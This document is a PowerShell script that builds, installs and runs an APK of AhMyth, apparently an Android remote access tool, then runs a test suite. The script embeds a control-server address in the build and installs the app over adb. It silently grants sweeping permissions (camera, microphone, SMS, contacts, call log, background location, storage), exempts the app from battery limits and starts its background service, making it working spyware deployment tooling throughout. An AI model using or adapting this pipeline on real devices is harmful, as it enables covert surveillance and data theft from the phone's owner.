# AhMyth Build, Install, Run & Test Suite
# Automatically builds APK with IP 192.168.0.177:1234, installs, runs, and tests

param(
    [string]$ServerIP = "192.168.0.177",
    [int]$ServerPort = 1234
)

$ErrorActionPreference = "Continue"

Write-Host ""
Write-Host "╔════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║     AhMyth Build, Install, Run & Test Suite              ║" -ForegroundColor Cyan
Write-Host "╚════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""

# Configuration
$PACKAGE_NAME = "ahmyth.mine.king.ahmyth"
$FACTORY_PATH = "$PSScriptRoot\AhMyth-Server\app\Factory"
$QUICK_BUILD_SCRIPT = "$FACTORY_PATH\quick-build.ps1"

# Step 1: Check ADB
Write-Host "[1/6] Checking ADB device..." -ForegroundColor Yellow
$devices = adb devices 2>&1 | Select-String -Pattern "device$"
if (-not $devices) {
    Write-Host "  ✗ No device found. Please connect a device or start an emulator." -ForegroundColor Red
    exit 1
}

$deviceId = ($devices[0] -split '\s+')[0]
Write-Host "  ✓ Using device: $deviceId" -ForegroundColor Green

# Step 2: Build APK
Write-Host ""
Write-Host "[2/6] Building APK..." -ForegroundColor Yellow
Write-Host "  Target: ${ServerIP}:${ServerPort}" -ForegroundColor Gray

if (-not (Test-Path $QUICK_BUILD_SCRIPT)) {
    Write-Host "  ✗ Build script not found: $QUICK_BUILD_SCRIPT" -ForegroundColor Red
    exit 1
}

Push-Location $FACTORY_PATH
try {
    & $QUICK_BUILD_SCRIPT -IP $ServerIP -Port $ServerPort
    if ($LASTEXITCODE -ne 0) {
        Write-Host "  ✗ Build failed" -ForegroundColor Red
        Pop-Location
        exit 1
    }
    
    # Find latest APK
    $apkFiles = Get-ChildItem -Filter "Ahmyth-*-aligned-debugSigned.apk" | 
        Sort-Object LastWriteTime -Descending | 
        Select-Object -First 1
    
    if (-not $apkFiles) {
        Write-Host "  ✗ APK not found after build" -ForegroundColor Red
        Pop-Location
        exit 1
    }
    
    $apkPath = $apkFiles.FullName
    $apkSize = [math]::Round($apkFiles.Length / 1MB, 2)
    Write-Host "  ✓ APK built: $($apkFiles.Name)" -ForegroundColor Green
    Write-Host "  Size: $apkSize MB" -ForegroundColor Gray
} finally {
    Pop-Location
}

# Step 3: Install APK
Write-Host ""
Write-Host "[3/6] Installing APK..." -ForegroundColor Yellow

Write-Host "  Uninstalling previous version..." -ForegroundColor Gray
adb -s $deviceId uninstall $PACKAGE_NAME 2>&1 | Out-Null

Write-Host "  Installing APK..." -ForegroundColor Gray
$installResult = adb -s $deviceId install -r -g "$apkPath" 2>&1
if ($installResult -match "Success" -or $installResult -match "success") {
    Write-Host "  ✓ APK installed successfully" -ForegroundColor Green
} else {
    Write-Host "  ✗ Installation failed: $installResult" -ForegroundColor Red
    exit 1
}

# Step 4: Grant Permissions
Write-Host ""
Write-Host "[4/6] Granting permissions..." -ForegroundColor Yellow

$permissions = @(
    "android.permission.CAMERA",
    "android.permission.RECORD_AUDIO",
    "android.permission.READ_CONTACTS",
    "android.permission.WRITE_CONTACTS",
    "android.permission.READ_SMS",
    "android.permission.SEND_SMS",
    "android.permission.RECEIVE_SMS",
    "android.permission.READ_CALL_LOG",
    "android.permission.READ_PHONE_STATE",
    "android.permission.CALL_PHONE",
    "android.permission.ACCESS_FINE_LOCATION",
    "android.permission.ACCESS_COARSE_LOCATION",
    "android.permission.ACCESS_BACKGROUND_LOCATION",
    "android.permission.READ_EXTERNAL_STORAGE",
    "android.permission.WRITE_EXTERNAL_STORAGE",
    "android.permission.POST_NOTIFICATIONS",
    "android.permission.GET_ACCOUNTS",
    "android.permission.ACCESS_WIFI_STATE",
    "android.permission.CHANGE_WIFI_STATE"
)

$appops = @(
    "SYSTEM_ALERT_WINDOW",
    "GET_USAGE_STATS",
    "WRITE_SETTINGS",
    "MANAGE_EXTERNAL_STORAGE",
    "REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
    "RUN_IN_BACKGROUND",
    "RUN_ANY_IN_BACKGROUND"
)

$granted = 0
foreach ($perm in $permissions) {
    adb -s $deviceId shell pm grant $PACKAGE_NAME $perm 2>&1 | Out-Null
    $granted++
}

foreach ($op in $appops) {
    adb -s $deviceId shell appops set $PACKAGE_NAME $op allow 2>&1 | Out-Null
    $granted++
}

adb -s $deviceId shell cmd deviceidle whitelist +$PACKAGE_NAME 2>&1 | Out-Null
$granted++

Write-Host "  ✓ Granted $granted permissions" -ForegroundColor Green

# Step 5: Start App
Write-Host ""
Write-Host "[5/6] Starting app..." -ForegroundColor Yellow

adb -s $deviceId shell am start -n ${PACKAGE_NAME}/${PACKAGE_NAME}.MainActivity 2>&1 | Out-Null
Start-Sleep -Seconds 2
adb -s $deviceId shell am startservice ${PACKAGE_NAME}/${PACKAGE_NAME}.MainService 2>&1 | Out-Null
Start-Sleep -Seconds 2

$pid = adb -s $deviceId shell pidof $PACKAGE_NAME 2>&1
if ($pid -and $pid.Trim()) {
    Write-Host "  ✓ App is running (PID: $($pid.Trim()))" -ForegroundColor Green
} else {
    Write-Host "  ⚠ App may not be running (check manually)" -ForegroundColor Yellow
}

# Step 6: Wait for connection and run tests
Write-Host ""
Write-Host "[6/6] Waiting for connection and running tests..." -ForegroundColor Yellow

Write-Host "  Waiting for client to connect..." -ForegroundColor Gray
$connected = $false
for ($i = 0; $i -lt 15; $i++) {
    $services = adb -s $deviceId shell dumpsys activity services | Select-String $PACKAGE_NAME
    if ($services -and $services.ToString().Contains("MainService")) {
        Write-Host "  ✓ Service is running" -ForegroundColor Green
        Start-Sleep -Seconds 3
        $connected = $true
        break
    }
    Start-Sleep -Seconds 2
    Write-Host "." -NoNewline -ForegroundColor Gray
}
Write-Host ""

if (-not $connected) {
    Write-Host "  ⚠ Connection timeout, but continuing with tests..." -ForegroundColor Yellow
}

Write-Host ""
Write-Host "Starting comprehensive test suite..." -ForegroundColor Cyan
Write-Host ""

# Run test suite
node test-comprehensive-suite.js

if ($LASTEXITCODE -ne 0) {
    Write-Host ""
    Write-Host "Test suite completed with errors." -ForegroundColor Red
    exit $LASTEXITCODE
} else {
    Write-Host ""
    Write-Host "All tests completed!" -ForegroundColor Green
}













